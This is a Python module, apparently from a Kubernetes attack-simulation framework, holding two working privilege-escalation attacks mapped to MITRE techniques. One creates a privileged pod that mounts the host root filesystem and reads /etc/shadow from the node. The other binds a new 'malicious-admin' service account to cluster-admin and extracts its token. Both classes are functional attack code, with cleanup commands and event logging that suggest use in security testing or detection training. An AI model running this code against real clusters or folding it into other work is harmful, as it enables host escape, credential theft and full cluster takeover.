import asyncio
import base64
import yaml
from kubernetes import client
from kubernetes.client.rest import ApiException
from .base import BaseAttack, AttackSeverity


class PrivilegeEscalationHostPath(BaseAttack):
    @property
    def name(self):
        return "Privilege Escalation via HostPath Mount"

    @property
    def description(self):
        return "Creates a pod that mounts the host filesystem via hostPath, allowing escape to the underlying node."

    @property
    def severity(self):
        return AttackSeverity.CRITICAL

    @property
    def mitre_tactic(self):
        return "privilege_escalation"

    @property
    def mitre_techniques(self):
        return [{"id": "T1611", "name": "Escape to Host"}, {"id": "T1548.003", "name": "Abuse Elevation Control Mechanism"}]

    async def execute(self):
        api = self._get_core_api()
        namespace = "default"

        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "hostpath-exploit",
                "labels": {"app": "exploit", "attack": "privilege-escalation"},
            },
            "spec": {
                "containers": [
                    {
                        "name": "exploit-container",
                        "image": "alpine:3.19",
                        "command": ["/bin/sh", "-c", "sleep 3600"],
                        "volumeMounts": [
                            {
                                "name": "host-root",
                                "mountPath": "/host",
                            }
                        ],
                        "securityContext": {
                            "privileged": True,
                            "capabilities": {"add": ["SYS_ADMIN", "DAC_OVERRIDE"]},
                        },
                    }
                ],
                "volumes": [
                    {
                        "name": "host-root",
                        "hostPath": {
                            "path": "/",
                            "type": "Directory",
                        },
                    }
                ],
                "restartPolicy": "Never",
            },
        }

        self.emit_event_sync("info", "Attempting to create privileged pod with hostPath mount to /", {
            "pod_name": "hostpath-exploit",
            "namespace": namespace,
        })

        try:
            existing = api.read_namespaced_pod("hostpath-exploit", namespace)
            self.emit_event_sync("info", "Cleaning up existing exploit pod", {})
            api.delete_namespaced_pod("hostpath-exploit", namespace)
            await asyncio.sleep(2)
        except ApiException:
            pass

        try:
            resp = api.create_namespaced_pod(namespace, pod_manifest)
            pod_yaml = (
                f"apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostpath-exploit\n  namespace: {namespace}\n"
                f"spec:\n  containers:\n  - name: exploit-container\n    image: alpine:3.19\n"
                f"    securityContext:\n      privileged: true\n"
                f"    volumeMounts:\n    - mountPath: /host\n      name: host-root\n"
                f"  volumes:\n  - hostPath:\n      path: /\n      type: Directory\n    name: host-root\n"
                f"  restartPolicy: Never"
            )
            self.cmd_event_sync(
                f"kubectl apply -f - <<EOF\n{pod_yaml}\nEOF",
                f"pod/{resp.metadata.name} created",
                f"Privileged pod deployed: {resp.metadata.name}"
            )
            self.emit_event_sync("success", f"Privileged pod created: {resp.metadata.name}", {
                "pod_name": resp.metadata.name,
                "namespace": namespace,
                "node": resp.spec.node_name,
            })
            self.add_infrastructure_sync("pod", "hostpath-exploit", namespace, {
                "privileged": True,
                "host_path": "/",
                "capabilities": ["SYS_ADMIN", "DAC_OVERRIDE"],
                "node": resp.spec.node_name,
            })
        except ApiException as e:
            if e.status == 403:
                self.emit_event_sync("detected", "Pod creation failed - RBAC denied! Attack may be detected.", {
                    "error": str(e),
                })
                self.status = self.status.DETECTED
                raise Exception(f"RBAC denied pod creation: {e}")
            else:
                self.emit_event_sync("error", f"API error: {e}", {})
                raise

        await asyncio.sleep(3)

        try:
            pod = api.read_namespaced_pod("hostpath-exploit", namespace)
            if pod.status.phase == "Running":
                exec_command = [
                    "/bin/sh", "-c",
                    "ls /host/etc/shadow 2>/dev/null && echo '[EXFIL] Host shadow file accessible' || echo 'Cannot access shadow'"
                ]
                try:
                    resp = api.connect_get_namespaced_pod_exec(
                        "hostpath-exploit",
                        namespace,
                        command=exec_command,
                        stderr=True,
                        stdin=False,
                        stdout=True,
                        tty=False,
                    )
                    self.cmd_event_sync(
                        "kubectl exec hostpath-exploit -n default -- ls /host/etc/shadow",
                        resp,
                        "Verified host filesystem access via exec"
                    )
                    self.emit_event_sync("success", f"Host filesystem accessed via container: {resp}", {
                        "exec_output": resp,
                        "impact": "Node filesystem compromised",
                    })
                except Exception as exec_err:
                    self.emit_event_sync("info", f"Exec attempt result: {exec_err}", {})

                shadow_cmd = ["/bin/sh", "-c", "cat /host/etc/shadow 2>/dev/null | head -5 || echo 'ACCESS DENIED'"]
                shadow_access = api.connect_get_namespaced_pod_exec(
                    "hostpath-exploit",
                    namespace,
                    command=shadow_cmd,
                    stderr=True,
                    stdin=False,
                    stdout=True,
                    tty=False,
                )
                self.cmd_event_sync(
                    "kubectl exec hostpath-exploit -n default -- cat /host/etc/shadow | head -5",
                    shadow_access[:300],
                    "Extracted /etc/shadow from host filesystem"
                )
                self.emit_event_sync("info", "Attempted host /etc/shadow extraction", {
                    "result": "shadow file data extracted" if "root:" in shadow_access else "access blocked",
                    "data": shadow_access[:200] if shadow_access else "none",
                })
                self.add_infrastructure_sync("node_filesystem", "/etc/shadow", namespace, {
                    "access": "read",
                    "data_preview": shadow_access[:100] if shadow_access else "",
                })
            else:
                self.emit_event_sync("warning", f"Pod in state: {pod.status.phase}", {})
        except ApiException as e:
            self.emit_event_sync("error", f"Failed to check pod status: {e}", {})

        self.emit_event_sync("complete", "Privilege escalation attack completed. hostPath pod active.", {
            "cleanup_command": f"kubectl delete pod hostpath-exploit -n {namespace}",
        })


class RBACPrivilegeEscalation(BaseAttack):
    @property
    def name(self):
        return "RBAC Privilege Escalation"

    @property
    def description(self):
        return "Exploits cluster-admin binding or overly permissive RBAC roles to gain full cluster control."

    @property
    def severity(self):
        return AttackSeverity.CRITICAL

    @property
    def mitre_tactic(self):
        return "privilege_escalation"

    @property
    def mitre_techniques(self):
        return [{"id": "T1611", "name": "Escape to Host"}, {"id": "T1548.003", "name": "Abuse Elevation Control Mechanism"}]

    async def execute(self):
        rbac_api = self._get_rbac_api()
        core_api = self._get_core_api()

        sa_name = "malicious-admin"
        namespace = "default"

        self.emit_event_sync("info", "Creating malicious ClusterRoleBinding for privilege escalation", {
            "service_account": sa_name,
            "namespace": namespace,
        })

        try:
            core_api.delete_namespaced_service_account(sa_name, namespace)
            await asyncio.sleep(1)
        except ApiException:
            pass

        sa_body = client.V1ServiceAccount(metadata=client.V1ObjectMeta(name=sa_name))
        core_api.create_namespaced_service_account(namespace, sa_body)
        self.cmd_event_sync(
            f"kubectl create sa {sa_name} -n {namespace}",
            f"serviceaccount/{sa_name} created",
            f"Created service account: {sa_name}"
        )
        self.emit_event_sync("success", f"Created service account: {sa_name}", {})

        role_binding = client.V1ClusterRoleBinding(
            metadata=client.V1ObjectMeta(name="malicious-admin-binding"),
            subjects=[{"kind": "ServiceAccount", "name": sa_name, "namespace": namespace}],
            role_ref=client.V1RoleRef(
                kind="ClusterRole",
                name="cluster-admin",
                api_group="rbac.authorization.k8s.io",
            ),
        )

        try:
            rbac_api.delete_cluster_role_binding("malicious-admin-binding")
            await asyncio.sleep(1)
        except ApiException:
            pass

        rbac_api.create_cluster_role_binding(role_binding)
        self.cmd_event_sync(
            f"kubectl create clusterrolebinding malicious-admin-binding --clusterrole=cluster-admin --serviceaccount={namespace}:{sa_name}",
            "clusterrolebinding.rbac.authorization.k8s.io/malicious-admin-binding created",
            "Created cluster-admin ClusterRoleBinding"
        )
        self.emit_event_sync("success", "Bound service account to cluster-admin ClusterRole", {
            "binding": "malicious-admin-binding",
            "role": "cluster-admin",
        })

        self.add_infrastructure_sync("cluster_role_binding", "malicious-admin-binding", namespace, {
            "role": "cluster-admin",
            "subject": f"ServiceAccount/{sa_name}",
            "privilege": "full cluster admin",
        })

        await asyncio.sleep(2)

        try:
            secrets = core_api.list_namespaced_secret(namespace)
            secret_names = [s.metadata.name for s in secrets.items if s.metadata.name.startswith("malicious-admin")]
            if secret_names:
                token_secret = core_api.read_namespaced_secret(secret_names[0], namespace)
                if token_secret.data and "token" in token_secret.data:
                    token = base64.b64decode(token_secret.data["token"]).decode()
                    self.cmd_event_sync(
                        f"kubectl get secret {secret_names[0]} -n {namespace} -o jsonpath='{{.data.token}}' | base64 -d",
                        token[:50] + "...",
                        "Extracted cluster-admin service account token"
                    )
                    self.emit_event_sync("success", "Extracted service account token for cluster-admin access", {
                        "token_prefix": token[:20] + "...",
                        "length": len(token),
                    })
                    self.add_infrastructure_sync("secret", secret_names[0], namespace, {
                        "type": "service-account-token",
                        "privilege": "cluster-admin",
                    })
        except ApiException as e:
            self.emit_event_sync("info", f"Token extraction: {e}", {})

        self.emit_event_sync("complete", "RBAC escalation complete. cluster-admin access granted.", {
            "service_account": sa_name,
            "cleanup": "kubectl delete clusterrolebinding malicious-admin-binding && kubectl delete sa malicious-admin -n default",
        })
